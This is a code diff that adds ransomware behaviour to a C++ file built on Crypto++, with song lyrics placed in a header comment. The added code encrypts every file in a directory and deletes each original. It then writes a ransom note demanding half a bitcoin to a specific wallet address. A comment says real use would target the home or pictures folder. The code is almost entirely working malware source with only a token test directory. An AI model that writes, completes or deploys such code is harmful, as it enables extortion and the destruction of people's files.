@@ -1,4 +1,3 @@
-
 /*
 Turn you to a dancer
 Yeah (Internet Money, bitch)
@@ -102,7 +101,6 @@ And I got two thick thots, wanna link the gang, yeah
 */
 
 #include <cryptopp/cryptlib.h>
-
 #include <cryptopp/base64.h>
 #include <cryptopp/hex.h>
 #include <cryptopp/rsa.h>
@@ -119,11 +117,12 @@ And I got two thick thots, wanna link the gang, yeah
 #include <iostream>
 #include <cstring>
 #include <vector>
+#include <filesystem> 
+#include <cstdio>
 #ifdef _WIN32
 #include <windows.h>
 #endif
 #include <string>
-#include <filesystem> 
 
 using namespace CryptoPP;
 using namespace std;
@@ -142,26 +141,37 @@ std::vector<std::string> get_filenames( std::filesystem::path path );
 
 int main(){
     int arg = 2;
-
-    string path_name = "/home/t3k3l/testdir";
+    //3 is ransom
+    //not 3 is decrypt
+    string path_name = "/home/t3k3l/testdir"; //testdir is only for testing, a real piece of ransomware will use an important directory like pictures or home.
     if(arg !=3){
+        //decryption
         for( const auto& name : get_filenames(path_name)){
             std::cout << name << '\n';
             string encryptedFile = name;
-            string decryptedFile = name + "_decrypted";
+            string decryptedFile = name + "_dec";
             const char* keyFile = "aeskey.bin";
             decrypt(encryptedFile.c_str(), decryptedFile.c_str(), keyFile);
-
+            remove(encryptedFile.c_str());
+            rename(decryptedFile.c_str(), name.c_str());
         }
     }
     else{
+        //encryption
         for( const auto& name : get_filenames( path_name ) ) {
             std::cout << name << '\n' ; 
             string inputFile = name;
             string encryptedFile = name + "_enc";
             const char* keyFile = "aeskey.bin";
             encrypt(inputFile.c_str(), encryptedFile.c_str(), keyFile);
+            remove(inputFile.c_str());
+            rename(encryptedFile.c_str(), name.c_str());
         }
+        std::ofstream outfile ("RANSOMEDFILES.txt");
+
+        outfile << "YOUR FILES ARE ENCRYPTED \n PLEASE PAY .5 BTC TO THE FOLLOWING CRYPTO WALLET TO RECIEVE THE DECRYPTION PROGRAM AND KEY \n 1Lbcfr7sAHTD9CgdQo3HTMTkV8LK4ZnX71" << std::endl;
+
+        outfile.close();
     }
     
     
